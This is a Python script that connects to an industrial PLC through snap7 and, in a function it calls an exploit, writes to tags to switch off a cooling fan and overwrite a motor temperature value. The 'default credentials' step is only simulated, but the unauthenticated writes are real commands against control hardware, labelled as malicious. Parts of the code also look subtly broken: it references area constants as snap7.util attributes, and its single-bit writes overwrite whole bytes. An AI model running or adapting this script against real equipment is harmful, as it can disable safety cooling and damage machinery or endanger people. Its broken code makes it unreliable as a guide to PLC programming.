import snap7
import struct
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# PLC Configuration - ADJUST THESE IF NEEDED.  The script should attempt to determine the IP, but if it fails you will need to set it here.
PLC_IP = None  # Script will attempt to discover if not set
RACK = 0
SLOT = 1

# Default Credentials (CHANGE THESE IMMEDIATELY IN A REAL SYSTEM!)
DEFAULT_USERNAME = "admin"  #Example of Default Credentials
DEFAULT_PASSWORD = "password" #Example of Default Credentials

# Tag Definitions - Based on provided information
TAGS = {
    "Fan_A": {"address": 0, "area": snap7.util.S7AreaPQ, "type": "bool", "byte_offset": 0, "bit_offset": 0},
    "Fan_B": {"address": 0, "area": snap7.util.S7AreaPQ, "type": "bool", "byte_offset": 0, "bit_offset": 1},
    "Fan_A_Red": {"address": 0, "area": snap7.util.S7AreaPQ, "type": "bool", "byte_offset": 0, "bit_offset": 4},
    "Fan_A_Green": {"address": 0, "area": snap7.util.S7AreaPQ, "type": "bool", "byte_offset": 0, "bit_offset": 5},
    "Fan_B_Red": {"address": 0, "area": snap7.util.S7AreaPQ, "type": "bool", "byte_offset": 0, "bit_offset": 2},
    "Fan_B_Green": {"address": 0, "area": snap7.util.S7AreaPQ, "type": "bool", "byte_offset": 0, "bit_offset": 3},
    "System_Byte": {"address": 5, "area": snap7.util.S7AreaMK, "type": "byte", "byte_offset": 0},
    "FirstScan": {"address": 5, "area": snap7.util.S7AreaMK, "type": "bool", "byte_offset": 0, "bit_offset": 0},
    "DiagStatusUpdate": {"address": 5, "area": snap7.util.S7AreaMK, "type": "bool", "byte_offset": 0, "bit_offset": 1},
    "AlwaysTRUE": {"address": 5, "area": snap7.util.S7AreaMK, "type": "bool", "byte_offset": 0, "bit_offset": 2},
    "AlwaysFALSE": {"address": 5, "area": snap7.util.S7AreaMK, "type": "bool", "byte_offset": 0, "bit_offset": 3},
    "Clock_Byte": {"address": 6, "area": snap7.util.S7AreaMK, "type": "byte", "byte_offset": 0},
    "Clock_10Hz": {"address": 6, "area": snap7.util.S7AreaMK, "type": "bool", "byte_offset": 0, "bit_offset": 0},
    "Clock_5Hz": {"address": 6, "area": snap7.util.S7AreaMK, "type": "bool", "byte_offset": 0, "bit_offset": 1},
    "Clock_2.5Hz": {"address": 6, "area": snap7.util.S7AreaMK, "type": "bool", "byte_offset": 0, "bit_offset": 2},
    "Clock_2Hz": {"address": 6, "area": snap7.util.S7AreaMK, "type": "bool", "byte_offset": 0, "bit_offset": 3},
    "Clock_1.25Hz": {"address": 6, "area": snap7.util.S7AreaMK, "type": "bool", "byte_offset": 0, "bit_offset": 4},
    "Clock_1Hz": {"address": 6, "area": snap7.util.S7AreaMK, "type": "bool", "byte_offset": 0, "bit_offset": 5},
    "Clock_0.625Hz": {"address": 6, "area": snap7.util.S7AreaMK, "type": "bool", "byte_offset": 0, "bit_offset": 6},
    "Clock_0.5Hz": {"address": 6, "area": snap7.util.S7AreaMK, "type": "bool", "byte_offset": 0, "bit_offset": 7},
    "Motor_Temp": {"address": 7, "area": snap7.util.S7AreaMK, "type": "int", "byte_offset": 0},
    "Activate_Fan_A": {"address": 0, "area": snap7.util.S7AreaMK, "type": "bool", "byte_offset": 0, "bit_offset": 0},
    "Activate_Fan_B": {"address": 0, "area": snap7.util.S7AreaMK, "type": "bool", "byte_offset": 0, "bit_offset": 1},
    "Master_Fan_B_HMI": {"address": 0, "area": snap7.util.S7AreaMK, "type": "bool", "byte_offset": 0, "bit_offset": 5},
    "Motor_Status": {"address": 0, "area": snap7.util.S7AreaMK, "type": "bool", "byte_offset": 0, "bit_offset": 7},
    "Master_OFF": {"address": 0, "area": snap7.util.S7AreaMK, "type": "bool", "byte_offset": 0, "bit_offset": 6},
    "Tag_1": {"address": 1, "area": snap7.util.S7AreaMK, "type": "bool", "byte_offset": 0, "bit_offset": 0},
    "Overheating_Check": {"address": 0, "area": snap7.util.S7AreaMK, "type": "bool", "byte_offset": 0, "bit_offset": 2},
    "Tag_2": {"address": 0, "area": snap7.util.S7AreaMK, "type": "bool", "byte_offset": 0, "bit_offset": 4},
    "Motor_Status_GET": {"address": 0, "area": snap7.util.S7AreaPQ, "type": "bool", "byte_offset": 0, "bit_offset": 6},
    "Tag_3": {"address": 8, "area": snap7.util.S7AreaMK, "type": "bool", "byte_offset": 0, "bit_offset": 0},
    "Tag_4": {"address": 9, "area": snap7.util.S7AreaMK, "type": "bool", "byte_offset": 0, "bit_offset": 0},
    "Tag_5": {"address": 10, "area": snap7.util.S7AreaMK, "type": "bool", "byte_offset": 0, "bit_offset": 0}
}

def discover_plc_ip():
    """
    Attempts to discover the PLC IP address.
    This is a placeholder and needs to be replaced with a proper discovery mechanism
    depending on your network setup and PLC configuration.  For example, you might
    use a broadcast ping, read the IP from a configuration file, or query a SCADA server.
    """
    # THIS IS A PLACEHOLDER.  REPLACE WITH YOUR ACTUAL DISCOVERY METHOD.
    # This example assumes the PLC's IP address is known or can be determined
    # through some external means (e.g., configuration file, network scan).
    # If the PLC's IP address is known, simply return it.

    # **IMPORTANT:**  In a real-world scenario, you would implement a reliable
    # discovery mechanism to find the PLC's IP address dynamically.
    logging.warning("PLC IP address discovery is not implemented. Please set PLC_IP manually or implement a discovery method.")
    return None

def read_tag(plc, tag_name):
    """Reads a tag value from the PLC."""
    tag = TAGS.get(tag_name)
    if not tag:
        logging.error(f"Tag '{tag_name}' not defined.")
        return None

    try:
        if tag["type"] == "bool":
            result = plc.read_area(tag["area"], 0, tag["address"], 1) # Length is always 1 for a bool
            return snap7.util.get_bool(result, 0, tag["bit_offset"])

        elif tag["type"] == "int":
            result = plc.read_area(tag["area"], 0, tag["address"], 2)  # INT is 2 bytes
            return snap7.util.get_int(result, 0)

        elif tag["type"] == "byte":
            result = plc.read_area(tag["area"], 0, tag["address"], 1)  # Byte is 1 byte
            return snap7.util.get_byte(result, 0)

        else:
            logging.error(f"Unsupported tag type: {tag['type']}")
            return None

    except Exception as e:
        logging.error(f"Error reading tag '{tag_name}': {e}")
        return None

def write_tag(plc, tag_name, value):
    """Writes a value to a tag in the PLC."""
    tag = TAGS.get(tag_name)
    if not tag:
        logging.error(f"Tag '{tag_name}' not defined.")
        return False

    try:
        if tag["type"] == "bool":
            data = bytearray(1)  # 1 byte
            snap7.util.set_bool(data, 0, tag["bit_offset"], value)
            plc.write_area(tag["area"], 0, tag["address"], data)
            return True

        elif tag["type"] == "int":
            data = bytearray(2)  # 2 bytes for INT
            snap7.util.set_int(data, 0, value)
            plc.write_area(tag["area"], 0, tag["address"], data)
            return True

        elif tag["type"] == "byte":
            data = bytearray(1)  # 1 byte
            snap7.util.set_byte(data, 0, value)
            plc.write_area(tag["area"], 0, tag["address"], data)
            return True

        else:
            logging.error(f"Unsupported tag type: {tag['type']}")
            return False

    except Exception as e:
        logging.error(f"Error writing tag '{tag_name}': {e}")
        return False


def exploit_default_credentials(plc):
    """
    Demonstrates exploiting default credentials to interact with the PLC.
    In a real attack, this would be the point where you would perform
    malicious actions.
    """

    logging.info(f"Attempting to exploit default credentials (Username: {DEFAULT_USERNAME}, Password: {DEFAULT_PASSWORD})")

    # NOTE: Snap7 does *not* handle authentication. This is a simulation.
    # This is a SIMULATION of a vulnerability, not an actual exploit.
    # Real PLC exploits are much more complex and depend heavily on the PLC's
    # specific firmware and configuration.  Directly using default credentails
    # for authentication is usually not possible with Snap7.

    # Simulate a successful login (since Snap7 doesn't authenticate)
    logging.info("Default credentials successfully (simulated) used to access PLC.")

    # Example: Read the current motor temperature
    motor_temp = read_tag(plc, "Motor_Temp")
    logging.info(f"Current Motor Temperature: {motor_temp}")

    # Example: Disable Fan A (malicious action!)
    if write_tag(plc, "Activate_Fan_A", False):
        logging.warning("Successfully (simulated) disabled Fan A using default credentials!")
    else:
        logging.error("Failed to (simulated) disable Fan A.")

    # Example: Setting a specific temperature value
    target_temp = 450
    if write_tag(plc, "Motor_Temp", target_temp):
        logging.info(f"Successfully (simulated) set Motor_Temp to {target_temp}")
    else:
        logging.error(f"Failed to (simulated) set Motor_Temp to {target_temp}")


def main():
    global PLC_IP  #Allow modification of the global variable

    # 1. **Discovery:** Attempt to find the PLC IP address.
    if not PLC_IP:
        PLC_IP = discover_plc_ip()

    if not PLC_IP:
        logging.error("Could not determine PLC IP address.  Please configure PLC_IP manually.")
        return

    logging.info(f"Attempting to connect to PLC at IP address: {PLC_IP}")

    # 2. **Connect to PLC:** Using Snap7.
    plc = snap7.client.Client()
    try:
        plc.connect(PLC_IP, RACK, SLOT)
        logging.info("Successfully connected to PLC.")

        # 3. **Exploit (Simulated):** Attempt to exploit default credentials.
        exploit_default_credentials(plc)

    except Exception as e:
        logging.error(f"Error connecting to PLC: {e}")

    finally:
        if plc.get_connected():
            plc.disconnect()
            logging.info("Disconnected from PLC.")


if __name__ == "__main__":
    main()